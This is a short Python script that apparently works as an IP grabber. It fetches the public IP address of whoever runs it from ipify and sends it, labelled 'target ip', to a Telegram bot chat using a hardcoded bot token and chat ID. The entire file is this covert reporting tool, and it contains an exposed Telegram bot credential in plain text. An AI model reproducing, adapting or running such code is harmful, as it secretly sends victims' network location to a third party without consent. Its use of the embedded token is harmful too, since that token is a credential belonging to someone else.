import requests

ipp = requests.get("https://api64.ipify.org?format=json").json()

ip=ipp["ip"]

id = 5775009662

token ='5718973411:AAFIO1I8iueNGzOaY4kLVKyVYpeSmWCaGxY'

requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target ip : {ip}")
